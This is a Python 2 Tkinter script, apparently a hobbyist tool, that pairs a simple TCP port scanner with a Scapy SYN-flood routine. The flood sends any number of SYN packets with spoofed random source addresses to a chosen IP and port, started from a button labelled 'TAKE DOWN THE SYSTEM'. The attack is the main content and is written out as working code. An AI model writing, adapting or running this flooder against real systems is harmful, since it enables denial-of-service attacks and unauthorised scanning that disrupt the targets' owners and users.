from scapy.all import *
import os
import sys
import random
import socket
import subprocess
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from Tkinter import *
from ScrolledText import *

###############
# Portscanner #
###############

def portScanner(ipentry):
	subprocess.call('clear', shell=True) 					
	
	remoteServer    = ipentry
	remoteServerIP  = socket.gethostbyname(remoteServer)
	
	display.insert(CURRENT, "List of open ports: " + "\n" + "\n")
	
	print("Please wait, scanning remote host", remoteServerIP,"\n")
	

	for port in range(3000):  
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = sock.connect_ex((remoteServerIP, port))
		if result == 0:
			display.insert(CURRENT, "Port {}: 	 Open".format(port) + "\n")
			print("Port {}: 	 Open".format(port))

		sock.close()

	display.insert(CURRENT, 'Scanning Completed',"\n")
	
########################
# Create a random Port #
########################

def randInt():
	x = random.randint(1000,9000) 
	return x
	
######################
# Create a random IP #
######################

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4)))) 		#XXX.XXX.XXX.XXX
	return ip
	
############
# Synflood #
############

def synflood(dstIP,dstPort, packets):
	total = 0
	print "Packets are sending ..."
	for x in range (0,packets):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()
	
		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP
		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total)

#########################
# Get IP from GUI entry #
#########################

def getIP():
    ip = ipEntry.get()
    portScanner(ip)
    
####################################
# Start Button for synflood attack #
####################################
    
def takeSystemDown():
	ipenter = ipEntry.get()
	port = portEntry.get()
	packet = int(packetEntry.get())
	synflood(ipenter, port, packet)


############
# GUI Part #
############

root = Tk()

root.title("Portscanner & Synflood")
    
content = Frame(root)
namelbl = Label(content, text="Hello")
namelbl2 = Label(content, text="If you don't know what you're doing - please leave!", bg="#f46e42")
namelbl3 = Label(content, text="Enter the IP: ")
namelbl4 = Label(content, text="Choose Port: ")
namelbl5 = Label(content, text="Amount Packets: ")


ipEntry = Entry(content, bg="grey")
portEntry = Entry(content, bg="grey")
packetEntry = Entry(content, bg="grey")


ScanButton = Button(content, text="Scan", command=getIP)
AttackButton = Button(content, text="TAKE DOWN THE SYSTEM", width=30, command=takeSystemDown)

display = ScrolledText(content, bg="grey")

emptyrow = Label(content)

# Grid layout
content.grid(column=0, row=0)
namelbl.grid(column=1, row=0)
namelbl2.grid(column=1, row=1,  pady=(20,0))

namelbl3.grid(column=0, row=2, pady=(50, 0))
ipEntry.grid(column=1, row=2, pady=(50,0))
ScanButton.grid(column=2, row=2,pady=(50,0))

display.grid(column=1, row=3, pady=(50,0))

namelbl4.grid(column=0, row=4, pady=(20,0))
portEntry.grid(column=1, row=4, pady=(20,0))

namelbl5.grid(column=0, row=5)
packetEntry.grid(column=1, row=5)

AttackButton.grid(row=6, columnspan=4, pady=(20,0))
root.mainloop()